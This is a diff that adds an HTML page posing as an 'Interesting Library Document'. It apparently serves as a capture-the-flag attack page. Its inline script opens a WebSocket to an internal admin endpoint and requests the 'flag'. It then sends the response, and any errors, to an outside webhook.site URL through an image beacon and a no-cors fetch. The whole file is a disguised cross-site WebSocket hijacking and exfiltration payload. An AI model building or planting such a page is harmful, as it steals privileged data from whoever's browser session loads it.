@@ -1,0 +1,53 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Library document</title>
+  </head>
+  <body>
+    <h1>Interesting Library Document</h1>
+
+    <script>
+      (function () {
+        const WEBHOOK = "https://webhook.site/ccf58a66-0e07-4ad6-9d1e-582c993cbf9f";
+
+        function exfil(data) {
+          try {
+            var i = new Image();
+            i.src = WEBHOOK + "?flag=" + encodeURIComponent(data);
+          } catch (e) {}
+          try {
+            fetch(WEBHOOK, {
+              method: "POST",
+              mode: "no-cors",
+              headers: {"Content-Type": "text/plain"},
+              body: data
+            });
+          } catch (e) {}
+        }
+
+        try {
+          const ws = new WebSocket("ws://web:8080/admin/ws");
+          ws.onopen = function () {
+            ws.send("flag");
+          };
+          ws.onmessage = function (ev) {
+            exfil(ev.data);
+            try { ws.close(); } catch (e) {}
+          };
+          ws.onerror = function () {
+            try {
+              var i = new Image();
+              i.src = WEBHOOK + "?err=1";
+            } catch (e) {}
+          };
+        } catch (e) {
+          try {
+            var i = new Image();
+            i.src = WEBHOOK + "?exception=" + encodeURIComponent(String(e));
+          } catch (ee) {}
+        }
+      })();
+    </script>
+  </body>
+</html>
